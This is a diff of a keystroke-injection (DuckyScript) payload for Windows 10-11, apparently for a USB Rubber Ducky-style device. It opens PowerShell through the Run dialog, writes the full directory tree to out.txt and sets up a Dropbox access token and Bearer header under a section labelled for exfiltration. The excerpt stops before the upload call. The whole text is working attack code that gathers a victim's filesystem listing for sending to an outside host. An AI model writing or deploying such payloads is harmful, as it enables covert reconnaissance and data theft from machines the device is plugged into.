@@ -1,4 +1,3 @@
-
 REM ###########################################################
 REM #                                                         |
 REM # Title        : Tree Structure Of The Operating System   |
@@ -9,25 +8,22 @@ REM # Target       : Windows 10-11                            |
 REM #                                                         |
 REM ###########################################################
 
-
 REM Requirements:
 REM     - Internet connection
 
+REM Set yout Dropbox access token
+DEFINE #DROPBOX_ACCESS_TOKEN example
 
 GUI r
 DELAY 1000
-STRING PowerShell
-ENTER
+STRINGLN PowerShell
 DELAY 1000
 
-STRINGLN  tree /f /a > out.txt; $filePath = ".\out.txt"
-
 REM Setting about exfiltration
-STRING $accessToken = 
-STRING DROPBOX_ACCESS_TOKEN
-ENTER
-
-STRINGLN
+STRINGLN_BLOCK
+    tree /f /a > out.txt
+    $filePath=".\out.txt";
+    $accessToken="#DROPBOX_ACCESS_TOKEN"
     $authHeader = @{Authorization = "Bearer $accessToken"}
     $dropboxFilePath = "/out_exported.txt"
 
